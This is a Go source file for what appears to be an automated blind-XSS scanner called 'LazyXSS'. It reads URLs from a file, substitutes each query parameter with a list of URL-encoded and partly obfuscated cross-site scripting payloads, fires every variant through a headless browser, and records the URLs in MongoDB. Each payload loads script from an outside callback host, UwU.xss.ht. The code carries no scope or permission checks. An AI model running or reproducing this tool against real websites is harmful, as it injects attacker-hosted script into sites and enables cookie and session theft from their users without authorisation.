package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/headzoo/surf"
	"github.com/headzoo/surf/browser"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

var payloads []string = []string{"%22%3E%3Cscript%20src%3Dhttps%3A%2F%2FUwU%2Exss%2Eht%3E%3C%2Fscript%3E", "javascript%3Aeval%28%27var%20a%3Ddocument%2EcreateElement%28%5C%27script%5C%27%29%3Ba%2Esrc%3D%5C%27https%3A%2F%2FUwU%2Exss%2Eht%5C%27%3Bdocument%2Ebody%2EappendChild%28a%29%27%29", "%22%3E%3Cinput%20onfocus%3Deval%28atob%28this%2Eid%29%29%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vVXdVLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%20autofocus%3E", "%22%3E%3Cimg%20src%3Dx%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vVXdVLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%20onerror%3Deval%28atob%28this%2Eid%29%29%3E&", "=%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this%2Eid%29%29%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vVXdVLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%26%2361%3B%3E%22", "%22%3E%3Ciframe%20srcdoc%3D%5C%22%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%23118%3B%26%2397%3B%26%23114%3B%26%2332%3B%26%2397%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23114%3B%26%23101%3B%26%2397%3B%26%23116%3B%26%23101%3B%26%2369%3B%26%23108%3B%26%23101%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2340%3B%26%2334%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2334%3B%26%2341%3B%26%2359%3B%26%2397%3B%26%2346%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3BUwU%2Exss%2Eht%26%2334%3B%26%2359%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2398%3B%26%23111%3B%26%23100%3B%26%23121%3B%26%2346%3B%26%2397%3B%26%23112%3B%26%23112%3B%26%23101%3B%26%23110%3B%26%23100%3B%26%2367%3B%26%23104%3B%26%23105%3B%26%23108%3B%26%23100%3B%26%2340%3B%26%2397%3B%26%2341%3B%26%2359%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%5C%22%3E", "%3Cscript%3Efunction%20b%28%29%7Beval%28this%2EresponseText%29%7D%3Ba%3Dnew%20XMLHttpRequest%28%29%3Ba%2EaddEventListener%28%22load%22%2C%20b%29%3Ba%2Eopen%28%22GET%22%2C%20%22%2F%2FUwU%2Exss%2Eht%22%29%3Ba%2Esend%28%29%3B%3C%2Fscript%3E%22%2C%20%22%3Cscript%3E%24%2EgetScript%28%22%2F%2FUwU%2Exss%2Eht%22%29%3C%2Fscript%3E"}
var urlString []string
var barrel []string
var shot string
var param []string
var bow *browser.Browser

func joinURL(urlString []string) string {
	result := ""

	result = result + urlString[0]
	for i := 1; i < len(urlString); i++ {
		numOfEquals := strings.Count(result, "=")
		numOfAnds := strings.Count(result, "&")

		if numOfEquals <= numOfAnds {
			result = result + "=" + urlString[i]
		} else {
			result = result + "&" + urlString[i]
		}

	}
	return result
}

func printBarrel(barrel []string) {
	for i := 0; i < len(barrel); i++ {
		fmt.Println("Shot " + strconv.Itoa(i) + " : " + barrel[i])
	}

}

func fire(shot string) {

	err := bow.Open(shot)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(bow.Title())
	fmt.Println(bow.StatusCode())

}

func main() {
	sleepTime := (2 * time.Second)
	bow = surf.NewBrowser()
	for {
		time.Sleep(sleepTime)

		file, err := os.Open("online.txt")
		if err != nil {
			fmt.Println(err)
		}
		defer file.Close()

		//initialise mongo client
		client, err := mongo.NewClient(options.Client().ApplyURI("mongodb://127.0.0.1:27017"))
		if err != nil {
			log.Fatal(err)
		}

		ctx, cancel := context.WithTimeout(context.Background(), 999999999*time.Second)
		err = client.Connect(ctx)
		if err != nil {
			log.Fatal(err)
		}
		defer cancel()

		collection := client.Database("LazyXSS").Collection("searchedURLs")
		time.Sleep(5 * time.Second)

		//go through each line in a file
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			var url string = scanner.Text()

			if strings.Contains(url, "=") {
				//fmt.Println(url)

				//fmt.Println("New URL discovered! : ", url)
				splitURL := strings.Split(url, "=")
				if len(splitURL) > 2 {
					for i := 0; i < len(splitURL); i++ {
						if strings.Contains(splitURL[i], "&") {
							temp := strings.Split(splitURL[i], "&")
							param = append(param, temp[0])
						} else {
							param = append(param, splitURL[len(splitURL)-1])
						}
					}
				} else {
					param = append(param, splitURL[len(splitURL)-1])
				}

				//get clean url for db
				cleanURL := url
				for i := 0; i < len(param); i++ {
					cleanURL = strings.Replace(cleanURL, param[i], "", -1)
				}

				count, err := collection.CountDocuments(ctx, bson.M{"Found": cleanURL})
				if err != nil {
					log.Fatal(err)
				}
				if count >= 1 {
					fmt.Println("Document exists in this collection! : ", cleanURL)

				} else {
					for i := 0; i < len(param); i++ {
						for j := 0; j < len(payloads); j++ {
							shot = strings.Replace(url, param[i], payloads[j], -1)
							fire(shot)
							fmt.Println("shot")
						}
					}

					_, err := collection.InsertOne(ctx, bson.M{
						"Found": cleanURL,
					})
					if err != nil {
						fmt.Println(err)
					}
					fmt.Println("added result to db : ", cleanURL)
				}

				param = nil
			}
			// Do stuff in here for main loop

		}

		defer client.Disconnect(ctx)

		if err := scanner.Err(); err != nil {
			fmt.Println(err)
		}

	}

}

/*
	example of how to insert for later
	result, err := collection.InsertOne(ctx, bson.M{
		"Found": "testurl",
	})
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(result)
*/

/*
	barrel = nil

	//numOfEquals := strings.Count(url, "=")
	fmt.Println("---------------------------------------------------")
	for i := 0; i < len(payloads); i++ {
		urlString = nil
		splitURL := strings.Split(url, "=")
		added := false
		if len(splitURL) > 2 {
			for j := 0; j < len(splitURL); j++ {
				if strings.Contains(splitURL[j], "&") && !added {
					temp := strings.Split(splitURL[j], "&")
					//urlString = append(urlString, payloads[i])
					urlString = append(urlString, "PAYLOADHERE")
					urlString = append(urlString, temp[1])

					added = true
				} else {
					urlString = append(urlString, splitURL[j])

				}

			}
		} else {
			urlString = append(urlString, splitURL[0])
			//urlString = append(urlString, payloads[i])
			urlString = append(urlString, "PAYLOADHERE")
			shot = joinURL(urlString)
		}

		shot = joinURL(urlString)
		barrel = append(barrel, shot)
	}
	printBarrel(barrel)
*/
